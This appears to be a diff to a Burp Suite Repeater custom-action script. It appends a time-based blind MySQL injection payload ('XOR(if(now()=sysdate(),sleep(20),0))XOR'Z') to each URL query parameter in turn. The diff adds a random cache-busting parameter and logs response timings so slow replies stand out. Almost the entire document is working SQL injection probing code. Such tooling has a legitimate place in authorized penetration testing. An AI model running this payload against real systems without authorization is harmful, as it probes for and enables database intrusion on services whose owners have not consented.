@@ -5,33 +5,72 @@ location: REPEATER
 source: |+
   /**
    * Append a time-based MySQL payload to each query parameter, one at a time.
-   * The action sends the modified requests sequentially so timing-based behavior
-   * can be observed via Logger or other Burp tools.
+   * Sends each mutated request sequentially and logs high-level timing data
+   * so you can watch for slow responses in Logger or the console.
    **/
   var payload = "'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z";
+  var bypassCache = true;
+  
   var baseRequest = requestResponse.request();
   if (baseRequest == null) return;
   
-  var queryParameters = baseRequest.parameters()
-      .stream()
-      .filter(p -> p.type() == HttpParameterType.URL)
-      .toList();
+  var originalPath = baseRequest.path();
+  int queryStart = originalPath.indexOf('?');
+  if (queryStart == -1 || queryStart == originalPath.length() - 1) return;
   
-  if (queryParameters.isEmpty()) return;
+  var basePath = originalPath.substring(0, queryStart);
+  var queryString = originalPath.substring(queryStart + 1);
+  var pairs = queryString.split("&", -1);
+  if (pairs.length == 0) return;
   
-  for (HttpParameter parameter : queryParameters) {
-      var originalValue = parameter.value() == null ? "" : parameter.value();
-      var mutatedParameter = HttpParameter.parameter(
-          parameter.name(),
-          originalValue + payload,
-          parameter.type()
-      );
-      var mutatedRequest = baseRequest
-          .withRemovedParameters(parameter)
-          .withAddedParameters(mutatedParameter);
-      var response = api().http().sendRequest(mutatedRequest);
-      if (response.hasResponse()) {
-          httpEditor.responsePane().set(response.response().toByteArray());
+  var alphabet = "abcdefghijklmnopqrstuvwxyz0123456789";
+  var secureRandom = new java.security.SecureRandom();
+  
+  for (int i = 0; i < pairs.length; i++) {
+      var pair = pairs[i];
+      int sep = pair.indexOf('=');
+      var name = (sep >= 0) ? pair.substring(0, sep) : pair;
+      var value = (sep >= 0) ? pair.substring(sep + 1) : "";
+  
+      var builder = new StringBuilder();
+      for (int j = 0; j < pairs.length; j++) {
+          if (j > 0) builder.append("&");
+          if (j == i) {
+              builder.append(name).append("=").append(value).append(payload);
+          } else {
+              builder.append(pairs[j]);
+          }
       }
+  
+      if (bypassCache) {
+          var cacheBuster = new StringBuilder();
+          for (int k = 0; k < 14; k++) {
+              cacheBuster.append(alphabet.charAt(secureRandom.nextInt(alphabet.length())));
+          }
+          builder.append("&_czb=").append(cacheBuster);
+      }
+  
+      var mutatedPath = basePath + "?" + builder.toString();
+      var mutatedRequest = baseRequest.withPath(mutatedPath);
+  
+      var result = api().http().sendRequest(mutatedRequest);
+      if (!result.hasResponse()) {
+          logging().logToOutput("[WARN] No response for param " + name);
+          continue;
+      }
+  
+      var timingOpt = result.timingData();
+      if (timingOpt.isEmpty()) continue;
+  
+      var timing = timingOpt.get();
+      java.time.Duration tStart = timing.timeBetweenRequestSentAndStartOfResponse();
+      java.time.Duration tEnd = timing.timeBetweenRequestSentAndEndOfResponse();
+      long startMs = (tStart != null ? tStart.toMillis() : -1);
+      long endMs = (tEnd != null ? tEnd.toMillis() : -1);
+      logging().logToOutput(
+          "[MySQLTimeBased] param=" + name +
+          " start=" + startMs + "ms" +
+          " end=" + endMs + "ms"
+      );
   }
 
